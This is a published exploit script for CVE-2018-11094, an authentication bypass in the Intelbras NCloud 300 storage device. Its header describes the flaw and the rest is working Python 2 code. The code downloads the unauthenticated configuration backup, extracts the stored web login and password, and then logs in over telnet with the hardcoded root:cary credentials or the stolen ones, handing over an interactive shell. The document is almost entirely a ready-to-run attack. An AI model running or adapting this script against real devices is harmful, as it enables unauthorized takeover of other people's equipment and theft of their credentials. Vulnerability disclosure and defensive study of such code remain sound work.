# Exploit Title: Intelbras NCloud Authentication bypass
# Date: 16/05/2018
# Exploit Author: Pedro Aguiar - pedro.aguiar@kryptus.com
# Vendor Homepage: http://www.intelbras.com.br/
# Version: 1.0
# Tested on: Linux
# CVE : CVE-2018-11094
# Description: As described here: https://blog.kos-lab.com/Hello-World/ the Ncloud 300 device does not properly
# enforce authentication, allowing an attacker to remotely download the configurations backup (&#039;/cgi-bin/ExportSettings.sh&#039;).
# The configurations backup file contains the web interface username and password. 
# Also, there are hardcoded credentials in the telnet service (root:cary), in cases where root user does not exist, 
# it was replaced by the web interface credentials. This exploit downloads the backup file and tries to use the credentials
# to log into the device using telnet.
 
import sys
import requests
import telnetlib
import re
 
def help():
    print &#039;Usage: &#039;
    print &#039;python exploit.py http://192.168.0.1&#039;
 
def pop_shell(host, user, password):
    if(user == "root"):
        print &#039;[+] Trying default credentials: root:cary&#039;
    else:
        print &#039;[+] Trying credentials obtained from /cgi-bin/ExportSettings.sh&#039;
        with open(&#039;NCLOUD_config.dat&#039;, "r") as f:
            content = f.read()
            user = content.split("Login=")[1].split("\n")[0]
            password = content.split("Password=")[1].split("\n")[0]
            #print &#039;User: &#039;+ user
            #print &#039;Password: &#039;+ password
            f.close()
    try:
            ip = re.findall( r&#039;[0-9]+(?:\.[0-9]+){3}&#039;, host)[0]
            tn = telnetlib.Telnet(ip, 23, timeout=10)
            tn.expect(["WORKGROUP login:"], 5)
            tn.write(user + "\r\n")
            tn.expect(["Password:"], 5)
            tn.write(password + "\r\n")
            i = tn.expect(["Login incorrect"], 5)
            if i[0] != -1:
                raise ValueError(&#039;[-] Wrong credential&#039;)
            tn.write("cat /proc/cpuinfo\r\n")
            tn.interact()
 
            tn.close()
    except Exception as e:
        print e
        if(user == "root"):
            pop_shell(host, &#039;try&#039;, &#039;again&#039;)
 
def exploit(host):
    print &#039;[*] Connecting to %s&#039; %host
    path = &#039;/cgi-bin/ExportSettings.sh&#039;
    payload = &#039;Export=Salvar&#039;
 
    response = requests.post(host + path, data=payload)
    response.raise_for_status()
 
    if(response.status_code == 200 and "Login=" in response.text):
        print &#039;[+] Config download was successful&#039;
        print &#039;[+] Saving backup file to NCLOUD_config.dat&#039;
        with open(&#039;NCLOUD_config.dat&#039;, "w") as f:
            f.write(response.text)
            f.close()
        pop_shell(host, "root", "cary")
def main():
    if len(sys.argv) < 2 or not sys.argv[1].startswith(&#039;http://&#039;):
        help()
        return
    host = sys.argv[1]
    exploit(host)
 
if __name__ == &#039;__main__&#039;:
    main()

